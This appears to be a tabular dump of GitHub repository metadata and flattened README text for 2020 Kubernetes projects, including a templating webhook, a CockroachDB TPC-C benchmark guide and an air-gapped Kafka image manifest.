pelotech,k8s-templated-configuration,,Mutating Admission Webhook for Templated Configuration Overview Often when working with teams new to Kubernetes we find their applications are not factored in a Kubernetes friendly way One of the most immediate ways this manifests itself is configuration and secret data being mixed together While we can address this by storing all configuration containing private data in secrets we ve found this causes a number of additional challenges when debugging or modifying configurations across environments Ideally we d be able to extract just the secret content from our configuration and at pod startup inject it into our ConfigMaps using a standard template format This Kubernetes controller adds that capability By injected an init container into newly created pods based on annotations we can split configuration and secrets in a way transparent to the underlying workloads At present we use envtemplate https github com orls envtemplate to evaluate go templated files In the future we will aim to support go templates with sprig to somewhat mirror Helm as well as extensible template engines to allow teams to use existing template files of their preferred format This repository is based on k8s webhook example a production ready Kubernetes admission webhook k8s admission webhooks example using Kubewebhook Structure The application is mainly structured in 3 parts main This is where everything is created wired configured and set up cmd k8s webhook cmd k8s webhook main go http This is the package that configures the HTTP server wires the routes and the webhook handlers internal http webhook internal http webhook Application services These services have the domain logic of the validators and mutators mutation template internal mutation template Logic for template pelo tech webhook Apart from the webhook referring stuff we have other parts like Decoupled metrics internal metrics Decoupled logger internal log Application command line flags cmd k8s webhook config go And finally there is an example of how we could deploy our webhooks on a production server Deploy deploy Webhooks template pelo tech Webhook type Mutating Resources affected pods This webhook adds an initContainer to parse secrets into volumes as template files TODO Put more details here k8s webhook example https github com pelotech k8s templated configuration k8s admission webhooks https kubernetes io docs reference access authn authz extensible admission controllers Kubewebhook https github com slok kubewebhook,2020-09-05T18:48:09Z,2020-11-27T04:25:32Z,Go,Organization,3,1,1,61,main,git-lucky#slok#kav,3,0,28,0,0,0,0
khergner,K8S-up-running,,Kubernetese kuard pod create via minikube git clone https github com khergner K8S up running git Appendix x chapter5 you can create kuard pods chapter6 loading,2020-12-10T17:46:09Z,2020-12-10T19:25:19Z,n/a,User,1,1,0,6,master,khergner,1,0,0,0,0,0,0
meyskens,intro-to-k8s,,Intro to Kubernetes These files are for demo purposes for my Intro to Kubernetes talk,2020-12-21T15:03:59Z,2020-12-24T00:11:51Z,n/a,User,1,1,0,2,main,meyskens,1,0,0,0,0,0,0
IBM,gradle-k8s-plugin,,gradle kubernetes plugin deploy ur java spring boot project without kubectl this project will help u doing these steps create default docker image based on https github com bmuschko gradle docker plugin which has already added in the dependency of this project create default service and deployment yaml deploy to ur k8s just config ur project like this kubernetes namespace namespace default default ibmcloud apiKey ibmcloudapikey clusterId ibmcloudclusterid configFilePath kubernetesSpringBootApplication appName default project name springBootActiveProfiles default namespace default default deployment default image default dockerfile images 0 will skip dockerPushImage if provided replicas 1 default 1 envs name1 value name2 valueFrom secret name secretName key secretKey name3 valueFrom configMap name configMapName key configMapKey default empty volumeMounts volumeName1 volumeMountPath1 volumeName2 volumeMountPath2 default empty sidecars volumes volumeName1 volumeFrom secret name secretName volumeName2 volumeFrom configMap name configMapName default empty service servicePorts prot tergetPort default 80 8080 tcp by default ingress todo add more api configMap secret pv serviceAccount role clusetRole roleBinding clusterRoleBinding separate deploy process for each apicombine any api u needs support helm charts,2020-11-21T10:43:31Z,2020-12-24T13:32:48Z,Groovy,Organization,3,1,1,1,main,stevemar,1,0,0,0,0,0,0
cyrilsebastian1811,K8s-Cluster-Configuration,cert-manager#external-dns#ingress-controller#k8s-cluster,Create Custom Resource Definitions for cert manager kubectl apply f https raw githubusercontent com jetstack cert manager release 0 8 deploy manifests 00 crds yaml Helm Chart 1 Installation helm dependency update cert manager kubectl create namespace cert manager kubectl label namespace cert manager certmanager k8s io disable validation true kubectl apply f https raw githubusercontent com jetstack cert manager release 0 8 deploy manifests 00 crds yaml 1 Upgradation helm upgrade security cert manager i n cert manager set external dns aws credentials accessKey external dns aws credentials secretKey letsencrypt staging true letsencrypt email external dns zoneIdFilters 0 external dns domainFilters 0 set nginx ingress controller replicaCount 1 nginx ingress controller service annotations external dns alpha kubernetes io hostname 2 Deletion helm delete security n cert manager kubectl delete f https raw githubusercontent com jetstack cert manager release 0 8 deploy manifests 00 crds yaml kubectl delete CustomResourceDefinition virtualservers k8s nginx org kubectl delete CustomResourceDefinition virtualserverroutes k8s nginx org kubectl delete ns cert manager,2020-09-18T06:05:48Z,2020-09-18T06:10:33Z,Smarty,User,1,1,0,3,master,cyrilsebastian1811,1,0,0,0,0,0,0
jhatcher9999,tpcc-distributed-k8s,,CockroachDB Distributed TPC C on Kubernetes Based on https www cockroachlabs com docs stable orchestrate cockroachdb with kubernetes multi cluster html Reference GCP US Regions Zones to choose from us east1 b c d Moncks Corner South Carolina USA us east4 a b c Ashburn Northern Virginia USA us west1 a b c The Dalles Oregon USA us west2 a b c Los Angeles California USA us west3 a b c Salt Lake City Utah USA us west4 a b c Las Vegas Nevada USA GCP Quotas If you need to increase GCP quotas go to this URL https console cloud google com iam admin quotas usage USED project Setup Steps Create GCP firewall rules to allow communication on port 26257 on all private address ranges bash gcloud compute firewall rules create allow cockroach internal allow tcp 26257 source ranges 10 0 0 0 8 172 16 0 0 12 192 168 0 0 16 Assumptions and Pre requisites gcloud is installed locally and configured for authentication and for the correct project kubectl is installed locally Create GCP K8S clusters bash MACHINETYPE e2 standard 16 GCEREGION1 us west1 GCEREGION2 us west2 GCEREGION3 us west3 ACCOUNT gcloud info grep Account awk print 2 cut d f 2 cut d f 1 GCLOUDPROJECT gcloud config get value project CLUSTER1 gke GCLOUDPROJECT GCEREGION1cockroachdb1 CLUSTER2 gke GCLOUDPROJECT GCEREGION2cockroachdb2 CLUSTER3 gke GCLOUDPROJECT GCEREGION3cockroachdb3 gcloud container clusters create cockroachdb1 region GCEREGION1 machine type MACHINETYPE num nodes 1 cluster ipv4 cidr 10 1 0 0 16 node locations GCEREGION1 a GCEREGION1 b GCEREGION1 c gcloud container clusters create cockroachdb2 region GCEREGION2 machine type MACHINETYPE num nodes 1 cluster ipv4 cidr 10 2 0 0 16 node locations GCEREGION2 a GCEREGION2 b GCEREGION2 c gcloud container clusters create cockroachdb3 region GCEREGION3 machine type MACHINETYPE num nodes 1 cluster ipv4 cidr 10 3 0 0 16 node locations GCEREGION3 a GCEREGION3 b GCEREGION3 c Notes I tried to use c2 standard 16 but they weren t available in all zones so I used e2 standard 16 instead If you don t specify a machine type parameter in the gcloud config get value project it will default to e2 medium I m specifying explicit ranges here for the pod networks I don t know if GCP is smart enough to create pod networks that don t overlap between clusters but I like being explicit about it here because then I know the ranges won t overlap and I can be a little more certain about what s actually happening When specifying num nodes 1 there will be 1 node created in each of the node locations So the above commands actually create 9 nodes Validate settings bash kubectl config get contexts You should see all 3 GCP k8s clusters listed Create role bindings for the k8s clusters bash kubectl create clusterrolebinding USER cluster admin binding clusterrole cluster admin user ACCOUNT context CLUSTER1 kubectl create clusterrolebinding USER cluster admin binding clusterrole cluster admin user ACCOUNT context CLUSTER2 kubectl create clusterrolebinding USER cluster admin binding clusterrole cluster admin user ACCOUNT context CLUSTER3 Get CockroachDB Kubernetes scripts bash mkdir multiregion cd curl OOOOOOOOO https raw githubusercontent com cockroachdb cockroach master cloud kubernetes multiregion README md client secure yaml cluster init secure yaml cockroachdb statefulset secure yaml dns lb yaml example app secure yaml external name svc yaml setup py teardown py Edit setup py and teardown py Update setup py with the correct contexts and regions variables python contexts us west1 gkecockroachlabs hatcher 284815us west1cockroachdb1 us west2 gkecockroachlabs hatcher 284815us west2cockroachdb2 us west3 gkecockroachlabs hatcher 284815us west3cockroachdb3 python regions Update tearddown py with the correct contexts variable same as above python contexts us west1 gkecockroachlabs hatcher 284815us west1cockroachdb1 us west2 gkecockroachlabs hatcher 284815us west2cockroachdb2 us west3 gkecockroachlabs hatcher 284815us west3cockroachdb3 Edit cockroachdb statefulset secure yaml To get the best performance we want to make sure that we re using SSD disks using larger drives which will give us better IOPS and throughput Requesting enough CPU and memory that our k8s pods get distributed onto different k8s nodes to avoid noisy neighbor issues Find this section towards the bottom and make the noted edits yaml volumeClaimTemplates metadata name datadir spec accessModes ReadWriteOnce add this next line storageClassName storage class ssd resources requests change this next line from 100Gi to 1024Gi storage 1024Gi Find this section and make the noted edits yaml containers name cockroachdb image cockroachdb cockroach v20 1 4 imagePullPolicy IfNotPresent add this next resources section resources requests cpu 15 memory 60G ports Create a manifest file for our SSD drives and create these objects in Kubernetes bash cat storage class ssd yaml apiVersion storage k8s io v1 kind StorageClass metadata name storage class ssd provisioner kubernetes io gce pd parameters type pd ssd EOF bash kubectl create f storage class ssd yaml context CLUSTER1 kubectl create f storage class ssd yaml context CLUSTER2 kubectl create f storage class ssd yaml context CLUSTER3 Run the setup py script bash python2 7 setup py Verify that the pods are created bash kubectl get pods selector app cockroachdb all namespaces context CLUSTER1 kubectl get pods selector app cockroachdb all namespaces context CLUSTER2 kubectl get pods selector app cockroachdb all namespaces context CLUSTER3 You should see 3 3 for the CockroachDB pods Create additional k8s nodes in GCP to host the TPC C workload pods bash gcloud container node pools create workloadnodes cluster cockroachdb1 disk type pd ssd machine type MACHINETYPE num nodes 1 zone GCEREGION1 node locations GCEREGION1 a gcloud container node pools create workloadnodes cluster cockroachdb2 disk type pd ssd machine type MACHINETYPE num nodes 1 zone GCEREGION2 node locations GCEREGION2 a gcloud container node pools create workloadnodes cluster cockroachdb3 disk type pd ssd machine type MACHINETYPE num nodes 1 zone GCEREGION3 node locations GCEREGION3 a Create a pod in each k8s cluster which will be used to run our TPC C workload bash kubectl create f client secure yaml context CLUSTER1 kubectl create f client secure yaml context CLUSTER2 kubectl create f client secure yaml context CLUSTER3 If you want to get a sql shell bash kubectl exec it cockroachdb client secure context CLUSTER1 namespace default cockroach sql certs dir cockroach certs host cockroachdb public kubectl exec it cockroachdb client secure context CLUSTER2 namespace default cockroach sql certs dir cockroach certs host cockroachdb public kubectl exec it cockroachdb client secure context CLUSTER3 namespace default cockroach sql certs dir cockroach certs host cockroachdb public Create a CockroachDB user which we can use to access the Admin UI bash kubectl exec it cockroachdb client secure context CLUSTER1 namespace default cockroach sql certs dir cockroach certs host cockroachdb public execute CREATE USER roach WITH PASSWORD whateverpasswordyouwant GRANT admin TO roach Port foward 8080 to the Admin UI on our first k8s cluster bash kubectl port forward cockroachdb 0 8080 context CLUSTER1 namespace GCEREGION1 Set enterprise license bash kubectl exec it cockroachdb client secure context CLUSTER1 namespace default cockroach sql certs dir cockroach certs host cockroachdb public execute SET CLUSTER SETTING cluster organization MultiRegionDemo SET CLUSTER SETTING enterprise license crl 0 Note you need the license in place to do the partitioning stuff in the next step Import the correct data for TPC C bash time kubectl exec it cockroachdb client secure context CLUSTER1 namespace default cockroach workload fixtures import tpcc warehouses 1000 partition affinity 0 partitions 3 partition strategy leases zones us west1 us west2 us west3 postgresql root cockroachdb public 26257 sslmode verify full sslcert cockroach certs client root crt sslkey cockroach certs client root key sslrootcert cockroach certs ca crt Note I m using cockroach workload fixtures import tpcc instead of cockroach workload init tpcc By doing so the data is imported rathen than being inserted It runs in about 30 minutes as opposed to 90 minutes Note You can run this on one workload not all three Export the schema zones and ranges so that we can validate the setup bash kubectl exec it cockroachdb client secure context CLUSTER1 namespace default cockroach dump tpcc dump mode schema certs dir cockroach certs host cockroachdb public schema txt kubectl exec it cockroachdb client secure context CLUSTER1 namespace default cockroach sql certs dir cockroach certs host cockroachdb public execute SHOW ALL ZONE CONFIGURATIONS zoneconfigs txt kubectl exec it cockroachdb client secure context CLUSTER1 namespace default cockroach sql certs dir cockroach certs host cockroachdb public execute SELECT COUNT 1 tablename leaseholderlocality FROM SHOW RANGES FROM DATABASE tpcc GROUP BY 2 3 ORDER BY 3 2 ranges txt Run the TPC C workload on all three workload nodes bash kubectl exec it cockroachdb client secure context CLUSTER1 namespace default cockroach workload run tpcc duration 60m warehouses 1000 ramp 180s partition affinity 0 partitions 3 partition strategy leases postgresql root cockroachdb public 26257 sslmode verify full sslcert cockroach certs client root crt sslkey cockroach certs client root key sslrootcert cockroach certs ca crt kubectl exec it cockroachdb client secure context CLUSTER2 namespace default cockroach workload run tpcc duration 60m warehouses 1000 ramp 180s partition affinity 1 partitions 3 partition strategy leases postgresql root cockroachdb public 26257 sslmode verify full sslcert cockroach certs client root crt sslkey cockroach certs client root key sslrootcert cockroach certs ca crt kubectl exec it cockroachdb client secure context CLUSTER3 namespace default cockroach workload run tpcc duration 60m warehouses 1000 ramp 180s partition affinity 2 partitions 3 partition strategy leases postgresql root cockroachdb public 26257 sslmode verify full sslcert cockroach certs client root crt sslkey cockroach certs client root key sslrootcert cockroach certs ca crt Look at results You can see the summary of the three workload apps after they ve finished And you can look at metrics from the Admin UI Your output should look like elapsederrorsops total ops sec cum avg ms p50 ms p95 ms p99 ms pMax ms result 3600 0s 0 575026 159 7 98 2 109 1 184 5 251 7 1208 0 Audit check 9 2 1 7 PASS Audit check 9 2 2 5 1 PASS Audit check 9 2 2 5 2 PASS Audit check 9 2 2 5 3 PASS Audit check 9 2 2 5 4 PASS Audit check 9 2 2 5 5 PASS Audit check 9 2 2 5 6 PASS elapsedtpmCefcavg ms p50 ms p90 ms p95 ms p99 ms pMax ms 3600 0s 4160 5 32 4 128 1 117 4 159 4 226 5 268 4 1040 2 elapsederrorsops total ops sec cum avg ms p50 ms p95 ms p99 ms pMax ms result 3600 0s 0 575130 159 8 72 3 71 3 142 6 201 3 2281 7 Audit check 9 2 1 7 PASS Audit check 9 2 2 5 1 PASS Audit check 9 2 2 5 2 PASS Audit check 9 2 2 5 3 PASS Audit check 9 2 2 5 4 PASS Audit check 9 2 2 5 5 PASS Audit check 9 2 2 5 6 PASS elapsedtpmCefcavg ms p50 ms p90 ms p95 ms p99 ms pMax ms 3600 0s 4162 2 32 4 94 1 88 1 130 0 176 2 218 1 2281 7 elapsederrorsops total ops sec cum avg ms p50 ms p95 ms p99 ms pMax ms result 3600 0s 0 577825 160 5 70 8 58 7 176 2 234 9 1040 2 Audit check 9 2 1 7 PASS Audit check 9 2 2 5 1 PASS Audit check 9 2 2 5 2 PASS Audit check 9 2 2 5 3 PASS Audit check 9 2 2 5 4 PASS Audit check 9 2 2 5 5 PASS Audit check 9 2 2 5 6 PASS elapsedtpmCefcavg ms p50 ms p90 ms p95 ms p99 ms pMax ms 3600 0s 4178 4 32 5 90 1 88 1 130 0 184 5 243 3 1040 2 Teardown Steps Run the teardown py script bash python2 7 teardown py Delete the storage class we created earlier bash kubectl delete storageclass storage class ssd cluster CLUSTER1 kubectl delete storageclass storage class ssd cluster CLUSTER2 kubectl delete storageclass storage class ssd cluster CLUSTER3 Destroy the GCP k8s clusters bash gcloud container clusters delete cockroachdb1 region GCEREGION1 quiet gcloud container clusters delete cockroachdb2 region GCEREGION2 quiet gcloud container clusters delete cockroachdb3 region GCEREGION3 quiet,2020-09-16T14:33:11Z,2020-09-16T15:27:36Z,n/a,User,1,1,0,2,master,jhatcher9999,1,0,0,0,0,0,0
FarhanTaib,k8s-logrotate-container,,k8s logrotate container Kubernetes container to do cronjob and logrotate Usage Change the logrotate path and namespaces accordingly as your requirement Deploy the container bash kubectl apply f daemonset yaml,2020-10-07T02:12:17Z,2020-10-07T02:32:34Z,n/a,User,1,1,0,7,main,FarhanTaib,1,0,0,0,0,0,0
cloudnativer,k8s-contiv-ui,,1 Brief overview K8s contiv ui is a kubernetes cloud network scheduling management platform based on contiv UI optimization K8s contiv ui covers the functions commonly used in k8s network such as multi tenant management subnet management QoS bandwidth limiting security isolation and so on The underlying layer can be compatible with vxlan and VLAN network architecture K8s contiv ui fully supports Chinese which can be used by individuals or organizations familiar with Chinese k8s contiv uicontiv uik8sk8sQoSVxLanVLan k8s contiv ui 2 Installation Since k8s contiv ui is the underlying layer and runs on the CNI plug in contiv netplugin please make sure that the contiv netplugin plug in is running normally on your k8s cluster k8s contiv uicontiv netpluginCNIcontiv netplugink8s 2 1 Making a mirror image docker load basic dep images auth proxy image tar docker build t k8s contiv ui v0 1 Sending build context to Docker daemon 46 48MB Step 1 3 FROM authproxy 1 2 0 b7435212f1b9 Step 2 3 COPY localcerts localcerts Using cache 006809b01bc5 Step 3 3 COPY app ui Using cache 8642a0708fb4 Successfully built 8642a0708fb4 Successfully tagged k8s contiv ui v0 1 2 2 Deploy application Creating k8s contiv ui in k8s cluster k8sk8s contiv ui kubectl apply f yaml k8s contiv ui yaml 2 3 Login Expose the k8s contiv ui service outside the k8s cluster and open it with a browser https IP 1443 k8s contiv uik8shttps IP 1443 Enter the default user name admin and password admin to login admin admin k8s contiv ui docs images readme 6 jpg 3 Function introduction 3 1 Platform overview k8s contiv ui docs images readme 7 jpg 3 2 Multi tenant management k8s contiv ui docs images readme 1 jpg 3 3 Subnet management k8s contiv ui docs images readme 2 jpg k8s contiv ui docs images readme 3 jpg 3 4 QoS bandwidth isolation QoS k8s contiv ui docs images readme 4 jpg k8s contiv ui docs images readme 5 jpg You can actually install the deployment to experience more features,2020-10-15T05:15:57Z,2020-10-16T02:14:54Z,JavaScript,User,1,1,0,20,main,cloudnativer,1,1,1,1,0,0,0
agftech,avancadev-k8s-msb,avancadev#docker-composer#dockerfile#golang#kind#kubectl#kubernetes#rabbit-mq,avancadev k8s msb,2020-11-09T20:20:15Z,2020-11-10T21:18:33Z,Go,User,1,1,0,2,main,agftech,1,0,0,0,0,0,0
kay07,k8s-elk-nfs,,k8s elk nfs Use NFS to mount the data volume so you need to install the NFS server in advance and you need to give the permission of host to mount the path If you do not mount data please delete the data volume in elasticsearch yaml,2020-10-23T06:52:44Z,2020-10-29T07:10:49Z,n/a,User,1,1,0,5,main,kay07,1,0,0,0,0,0,0
wccsama,k8s-multiple-service,,k8s multiple service multiple serviceimport export service importk8s import servicecontrolleryamlkubeconfig kubeconfig build make build endpointsserviceAnamespaceservice BnamespaceCRD controller CRDservice TODO,2020-11-14T12:41:41Z,2020-11-21T11:42:09Z,Go,User,1,1,0,1,master,wccsama,1,0,0,0,0,0,0
KubeDev,k8s-api-produto,,,2020-09-28T02:24:05Z,2020-10-01T12:20:00Z,n/a,Organization,1,1,1,2,master,fabricioveronez,1,0,0,0,0,0,0
charmed-kubernetes,interface-k8s-service,,K8s service Operator Interface,2020-10-30T15:02:39Z,2020-12-04T14:43:45Z,Python,Organization,8,1,1,5,main,DomFleischmann#chris-sanders#johnsca,3,0,0,0,0,0,4
dhasuda,Bazel-and-K8s,,Bazel and K8s This repo is a guide for how we migrated to a monorepo for our K8s configs in VTEX,2020-12-23T13:56:09Z,2020-12-28T20:44:30Z,n/a,User,1,1,0,4,main,dhasuda,1,0,0,0,0,0,0
renoki-co,laravel-php-k8s,cluster#eks#elastic-kubernetes-service#gke#google#google-kubernetes-engine#k8s#kubernetes#laravel#php-k8s,Laravel PHP K8s CI https github com renoki co laravel php k8s workflows CI badge svg branch master codecov https codecov io gh renoki co laravel php k8s branch master graph badge svg https codecov io gh renoki co laravel php k8s branch master StyleCI https github styleci io repos 307696878 shield branch master https github styleci io repos 307696878 Latest Stable Version https poser pugx org renoki co laravel php k8s v stable https packagist org packages renoki co laravel php k8s Total Downloads https poser pugx org renoki co laravel php k8s downloads https packagist org packages renoki co laravel php k8s Monthly Downloads https poser pugx org renoki co laravel php k8s d monthly https packagist org packages renoki co laravel php k8s License https poser pugx org renoki co laravel php k8s license https packagist org packages renoki co laravel php k8s Just a simple port of renoki co php k8s https github com renoki co php k8s for easier access in Laravel Supporting Renoki Co on GitHub aims on bringing a lot of open source projects and helpful projects to the world Developing and maintaining projects everyday is a harsh work and tho we love it If you are using your application in your day to day job on presentation demos hobby projects or even school projects spread some kind words about our work or sponsor our work Kind words will touch our chakras and vibe while the sponsorships will keep the open source projects alive ko fi https www ko fi com img githubbuttonsm svg https ko fi com R6R42U8CL Installation You can install the package via composer bash composer require renoki co laravel php k8s Publish the config bash php artisan vendor publish provider RenokiCoLaravelK8sLaravelK8sServiceProvider tag config Usage The cluster configuration can be found in the config k8s php file You can get started directly with the kube config file you already have php use RenokiCoLaravelK8sLaravelK8sFacade foreach LaravelK8sFacade getAllConfigMaps as cm cm getName For further documentation check renoki co php k8s https github com renoki co php k8s Multiple connections The package supports multiple connections configurations If you wish to select a specific one not the default one call connection before getting the cluster php use RenokiCoLaravelK8sLaravelK8sFacade cluster LaravelK8sFacade connection http getCluster Getting the cluster instance You can also call getCluster to get the instance of RenokiCoPhpK8sKubernetesCluster php cluster LaravelK8sFacade getCluster Testing bash vendor bin phpunit Contributing Please see CONTRIBUTING CONTRIBUTING md for details Security If you discover any security related issues please email alex renoki org instead of using the issue tracker Credits Alex Renoki https github com rennokki All Contributors contributors,2020-10-27T12:45:42Z,2020-12-11T12:00:33Z,PHP,Organization,1,1,0,15,master,rennokki,1,6,6,0,0,0,0
devshjeon,inflearn-k8s-study,,inflearn k8s study Lee Seung Gu Jeon Seung Ho o 1 7 1 2 9 3 3 2 4 3 5 4 Pod 6 5 7 6 1 1 1 2 Google Meet LSG JSH 2020 12 25 whitecheckmark whitecheckmark Pod https www inflearn com course EC BF A0 EB B2 84 EB 84 A4 ED 8B B0 EC 8A A4 EA B8 B0 EC B4 88 dashboard,2020-12-20T08:32:03Z,2020-12-27T13:54:15Z,Shell,User,1,1,0,9,main,devshjeon#leeseunggu,2,0,0,0,0,0,6
raft-tech,airgapped-kafka-k8s,,airgapped kafka k8s Purpose This repo tracks details for images necessary to run a proposed MVP Kafka Cassandra cluster on k8s It provides automation and documents testing that ensures that containers of these images can run in an air gapped environment with a basic pub sub Services Covered MVP services in bold Apache Cassandra Confluent Platform Apache Kafka Apache NiFi Apache Spark Dask Python Parallel Computing Image Manifest An expanded manifest with alternate versions also available docs imagemanifests md Service Component Needed for MVP In IronBank Image Version License URL Confluent Kafka confluent kafka Confluent Zookeeper Yes Yes confluentinc cp zookeeper 5 5 2 5 5 2 Commercial https github com confluentinc cp docker images tree 5 3 3 post debian zookeeper Confluent Kafka Yes Yes confluentinc cp kafka 5 5 2 5 5 2 Commercial https github com confluentinc cp docker images tree 5 3 3 post debian kafka Confluent Schema Registry Yes Yes confluentinc cp schema registry 5 5 2 5 5 2 Commercial https github com confluentinc cp docker images tree 5 3 3 post debian schema registry Confluent ksqlDB Server Yes Yes confluentinc cp ksqldb server 5 5 2 5 5 2 Commercial Confluent ksqlDB CLI Yes Yes confluentinc cp ksqldb cli 5 5 2 5 5 2 Commercial Confluent Control Center Yes No confluentinc cp enterprise control center 5 5 2 5 5 2 Commercial Confluent Kafka Connect Yes No confluentinc cp kafka connect 5 5 2 5 5 2 Commercial Confluent k8s Operator Service Yes No confluentinc cp operator service 0 419 0 0 419 0 Commercial Confluent k8s Operator Init Yes No confluentinc cp init container operator 5 5 2 0 5 5 2 0 Commercial Confluent k8s Operator Kafka Yes No confluentinc cp server operator 5 5 2 0 5 5 2 0 Commercial Confluent k8s Operator ksqlDB Server Yes No confluentinc cp ksqldb server operator 5 5 2 0 5 5 2 0 Commercial Confluent k8s Operator Schema Registry Yes No confluentinc cp schema registry operator 5 5 2 0 5 5 2 0 Commercial Confluent k8s Operator Control Center Yes No confluentinc cp enterprise control center operator 5 5 2 0 5 5 2 0 Commercial Confluent k8s Operator Zookeeper Yes No confluentinc cp zookeeper operator 5 5 2 0 5 5 2 0 Commercial Cassandra cassandra Rook Cassandra Operator Yes No rook cassandra v1 4 5 1 4 5 Apache License 2 0 https github com rook rook Apache Kafka apache kafka Apache Kafka core Zookeeper No No strimzi kafka 0 19 0 kafka 2 5 0 0 19 0 Apache License 2 0 https github com strimzi strimzi kafka operator Kafka Operator No No strimzi operator 0 19 0 0 19 0 Apache License 2 0 https github com strimzi strimzi kafka operator Kafka Bridge No No strimzi kafka bridge 0 18 0 0 18 0 Apache License 2 0 https github com strimzi strimzi kafka operator JMX interface No No strimzi jmxtrans 0 19 0 0 19 0 Apache License 2 0 https github com strimzi strimzi kafka operator KafkaHQ kafkahq Kafka Dashboard No No tchiotludo akhq latest latest Apache License 2 0 https github com tchiotludo akhq Spark spark Spark Operator No No gcr io spark operator spark operator v1beta2 1 2 1 3 0 0 v1beta2 Apache License 2 0 https github com GoogleCloudPlatform spark on k8s operator Apache Spark core No No gcr io spark operator spark v3 0 0 3 0 0 Apache License 2 0 https github com GoogleCloudPlatform spark on k8s operator NiFi nifi Apache NiFi No No apache nifi 1 12 1 1 12 1 Apache License 2 0 https github com apache nifi NiFi Registry No No apache nifi registry 0 8 0 0 8 0 Apache License 2 0 https github com apache nifi registry MiNiFi No No apache nifi minifi 0 5 0 0 5 0 Apache License 2 0 https github com apache nifi minifi MiNiFi Command Control C2 No No apache nifi minifi c2 0 5 0 0 5 0 Apache License 2 0 https github com apache nifi minifi tree master minifi c2 MiNiFi C Implementation No No apache nifi minifi cpp 0 6 0 0 6 0 Apache License 2 0 https github com apache nifi minifi cpp Dask dask Dask Standalone single user No No daskdev dask 2 30 0 2 30 0 BSD 3 Clause License https github com dask dask docker Dask Gateway Server multi user No No daskgateway dask gateway server 0 8 0 0 8 0 BSD 3 Clause License https github com dask dask gateway tree master dask gateway server Dask Gateway client No No daskgateway dask gateway 0 8 0 0 8 0 BSD 3 Clause License https github com dask dask gateway tree master dask gateway Jupyter Hub dependency for Dask Gateway No No jupyterhub k8s hub 0 9 1 0 9 1 BSD 3 Clause License https github com apache nifi minifi cpp Service Details Confluent Kafka Confluent Platform https docs confluent io current getting started html is the commercial version of Kafka maintained and sold by Confluent Cassandra Rook https rook io docs rook v1 4 cassandra html is an OSS Kubernetes Operator for Apache Cassandra Rook is licensed under the Apache License 2 0 https github com rook rook blob master LICENSE Apache Kafka Strimzi https strimzi io docs operators latest deploying html deploying cluster operator helm chart str is an OSS Kubernetes Operator for Apache Kafka Strimzi is licensed under the Apache License 2 0 https github com strimzi strimzi kafka operator blob master LICENSE KafkaHQ Apache Kafka HQ AKHQ is an OSS dashboard webapp for Kafka AKHQ is licensed under the Apache License 2 0 https github com tchiotludo akhq blob dev LICENSE Spark Spark on k8s operator https github com GoogleCloudPlatform spark on k8s operator blob master docs quick start guide md is an unofficial project by Google Cloud Platform for Apache Spark Spark on k8s operator is licensed under the Apache License 2 0 https github com GoogleCloudPlatform spark on k8s operator blob master LICENSE NiFi All NiFi related components are licensed under the Apache License 2 0 https github com apache nifi blob main LICENSE Dask Dask https docs dask org en latest is a project by the NumPy Pandas Jupyter Scikit Learn developer community It is a community governed project and is fiscally sponsored by NumFOCUS the 501 c 3 sponsor of NumPy Pandas and Jupyter Dask is licensed under the BSD 3 Clause License https github com dask dask blob master LICENSE txt JupyterHub is licensed under the BSD 3 Clause License https github com jupyterhub jupyterhub blob master COPYING md Test steps WIP 1 Start Docker for Desktop w k8s support enabled 2 Perform the following shell commands zsh Setup export PROJECT airgapped kafka k8s git clone recurse submodules shallow submodules https github com raft tech PROJECT cd PROJECT Start local registry and import images docker compose up d export REGISTRY export CPVERSION 6 0 0 export CPOPERATORVERSION 6 0 0 0 sh scripts importimages sh Kafka test Confluent Platform Kafka TODO uses a set of operators from Confluent Apache Kafka FOSS distro export REGISTRY sh scripts kafkalocal sh Check install kubectl get deployments helm ls n operators kubectl get deployments n operators kubectl get pods n operators If jq not installed either brew install jq or remove jq from below kubectl get pod n operators kubectl get pods n operators no headers o custom columns metadata name o jsonpath spec containers env 3 jq Confirm output has image values prepended with localhost 5000 or your custom registry name NiFi test export REGISTRY sh scripts nfilocal sh kubectl get pods n nifi Rook test export REGISTRY sh scripts rooklocal sh kubectl get pods n rook cassandra system If jq not installed either brew install jq or remove jq from below kubectl get pod n rook cassandra system kubectl get pods n rook cassandra system no headers o custom columns metadata name o jsonpath spec containers env 3 jq Confirm output has image values prepended with localhost 5000 or your custom registry name Spark test Install Spark Operator helm repo add incubator http storage googleapis com kubernetes charts incubator helm install incubator sparkoperator generate name namespace operators set sparkJobNamespace default Check install helm ls n operators kubectl get deployments n operators kubectl get pods n operators If jq not installed either brew install jq or remove jq from below kubectl get pod n operators kubectl get pods n operators no headers o custom columns metadata name o jsonpath spec containers env 3 jq Confirm output has image values prepended with localhost 5000 or your custom registry name export REGISTRY sh scripts sparklocal sh kubectl get sparkapplications spark pi o yaml,2020-10-14T19:18:09Z,2020-11-10T22:47:17Z,Shell,Organization,4,1,0,29,main,potto007#omnipresent07#BarakStout,3,0,0,0,2,0,10
digitalsanctum,cert-issuers-k8s,,cert issuers k8s Use in concert with nginx ingress https kubernetes github io ingress nginx and cert manager https cert manager io docs Use issuer staging yaml for dev testing Use issuer prod yaml for production install kubectl apply f kubernetes,2020-09-08T15:57:32Z,2020-11-22T05:51:32Z,n/a,User,1,1,1,1,master,digitalsanctum,1,0,0,0,0,0,0
dhinojosa,k8s-security-concepts,,Kubernetes Security Concepts,2020-11-17T19:57:16Z,2020-12-10T16:01:18Z,n/a,User,1,1,1,15,main,dhinojosa,1,0,0,0,0,0,0
santiagon610,terraform-do-k8s,,Example Terraform Configuration Building a DigitalOcean Terraform Cluster Required Environment Variables Variable Name Description Example AWSS3ENDPOINT Regional endpoint of DigitalOcean Spaces server S3 etc nyc3 digitaloceanspaces com AWSDEFAULTREGION Must be an AWS region due to Terraform limitation us east 1 AWSACCESSKEYID Access Key for Spaces S3 etc ABCD1234ABCD1234ABCD1234 AWSSECRETACCESSKEY Secret Key for Spaces S3 etc A1B CDEFGHIJKLMN2O3Qr4St uvwXYza5BCDEF67g DIGITALOCEANACCESSTOKEN Personal access token from DigitalOcean abcdefghij1234567890klmnopqrstu01234567890vwxyzabcde1234567890fghi Building the Infrastructure Trigger from a pipeline or run local sh,2020-11-22T16:49:52Z,2020-12-14T10:33:18Z,HCL,User,1,1,0,3,main,santiagon610,1,0,0,0,0,0,1
yunionio,dashboard-module-k8s,,,2020-11-11T07:09:44Z,2020-12-19T09:09:28Z,Vue,Organization,4,1,1,52,master,SuperLuckyYU#lengband#houjiazong#zexi,4,0,513,0,0,0,0
